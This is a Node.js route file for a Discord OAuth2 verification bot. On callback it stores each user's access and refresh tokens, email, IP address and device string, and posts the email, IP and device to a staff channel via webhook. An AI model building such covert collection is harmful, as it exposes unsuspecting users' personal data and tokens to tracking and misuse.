const axios = require('axios');
const { users, config } = require('../database');
const { EmbedBuilder } = require('discord.js');

module.exports = (app, client) => {

    app.get('/', (req, res) => {
        res.render('index.html');
    });

    app.get('/oauth2/callback', async (req, res) => {
        const { code } = req.query;
        if (!code) return res.redirect('/error?msg=Missing code');

        try {
            const params = new URLSearchParams();
            params.append('client_id', process.env.CLIENT_ID);
            params.append('client_secret', process.env.CLIENT_SECRET);
            params.append('grant_type', 'authorization_code');
            params.append('code', code);
            params.append('redirect_uri', process.env.REDIRECT_URI);

            const tokenResponse = await axios.post(
                'https://discord.com/api/oauth2/token',
                params,
                { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
            );

            const { access_token, refresh_token, token_type } = tokenResponse.data;

            const userResponse = await axios.get(
                'https://discord.com/api/users/@me',
                { headers: { Authorization: `${token_type} ${access_token}` } }
            );

            const userData = userResponse.data;

            let ip =
                req.headers['cf-connecting-ip'] ||
                req.headers['x-forwarded-for'] ||
                req.socket.remoteAddress;

            if (ip && ip.includes(',')) ip = ip.split(',')[0].trim();

            const userDevice = req.headers['user-agent'] || 'Unknown';

            users.set(userData.id, {
                id: userData.id,
                username: userData.username,
                avatar: userData.avatar,
                email: userData.email,
                access_token,
                refresh_token,
                ip,
                userDevice,
                verifiedAt: new Date().toISOString()
            });

            const guildId = process.env.GUILD_ID;
            const roleId = config.get('roleId') || process.env.ROLE_ID;

            if (guildId) {
                try {
                    const putData = { access_token };
                    if (roleId) putData.roles = [roleId];

                    await axios.put(
                        `https://discord.com/api/guilds/${guildId}/members/${userData.id}`,
                        putData,
                        {
                            headers: {
                                Authorization: `Bot ${process.env.TOKEN}`,
                                'Content-Type': 'application/json'
                            },
                            validateStatus: false
                        }
                    );
                } catch {}
            }

            const createdAt = new Date(
                Number((BigInt(userData.id) >> 22n) + 1420070400000n)
            );

            const now = new Date();
            const accountDays = Math.floor(
                (now - createdAt) / (1000 * 60 * 60 * 24)
            );

            await sendLog(client, userData, ip, userDevice);

            const guild = client.guilds.cache.get(guildId);

            res.render('success.html', {
                userName: userData.username,
                userId: userData.id,
                userAvatar: userData.avatar
                    ? `https://cdn.discordapp.com/avatars/${userData.id}/${userData.avatar}.png`
                    : 'https://cdn.discordapp.com/embed/avatars/0.png',
                guildName: guild ? guild.name : 'Server',
                guildId: guildId || '0',
                guildIcon: guild && guild.icon
                    ? `https://cdn.discordapp.com/icons/${guildId}/${guild.icon}.png`
                    : 'https://cdn.discordapp.com/embed/avatars/0.png',
                accountDays
            });

        } catch (error) {
            res.redirect(
                `/error?msg=${encodeURIComponent(
                    error.response
                        ? JSON.stringify(error.response.data)
                        : error.message
                )}`
            );
        }
    });

    app.get('/error', (req, res) => {
        res.render('error.html', {
            error: req.query.msg || 'Unknown error'
        });
    });
};

async function sendLog(client, userData, ip, userDevice) {
    const logChannelId =
        config.get('logChannelId') || process.env.LOG_CHANNEL_ID;
    if (!logChannelId) return;

    const channel = client.channels.cache.get(logChannelId);
    if (!channel) return;

    let webhook;
    try {
        const webhooks = await channel.fetchWebhooks();
        webhook = webhooks.find(w => w.name === 'OAuth2');

        if (!webhook) {
            webhook = await channel.createWebhook({
                name: 'OAuth2',
                avatar: client.user.displayAvatarURL()
            });
        }
    } catch {
        return;
    }

    const creationDate = new Date(
        Number((BigInt(userData.id) >> 22n) + 1420070400000n)
    );

    const now = new Date();
    const creationAccountDays = Math.floor(
        (now - creationDate) / (1000 * 60 * 60 * 24)
    );

    const userAvatar = userData.avatar
        ? `https://cdn.discordapp.com/avatars/${userData.id}/${userData.avatar}.png`
        : 'https://cdn.discordapp.com/embed/avatars/0.png';

    const embed = new EmbedBuilder()
        .setColor(4806097)
        .setAuthor({
            name: `${userData.username} (${userData.id})`,
            iconURL: userAvatar
        })
        .setThumbnail(userAvatar)
        .setDescription(
            `**Menção:** <@${userData.id}>\n` +
            `**E-mail:** \`${userData.email || 'N/A'}\`\n` +
            `**Idade da Conta:** \`${creationAccountDays}\` dias`
        )
        .addFields(
            { name: 'Dispositivo', value: `\`${userDevice.substring(0, 1020)}\`` },
            { name: 'IP', value: `\`${ip}\`` }
        )
        .setTimestamp();

    await webhook.send({ embeds: [embed] });
}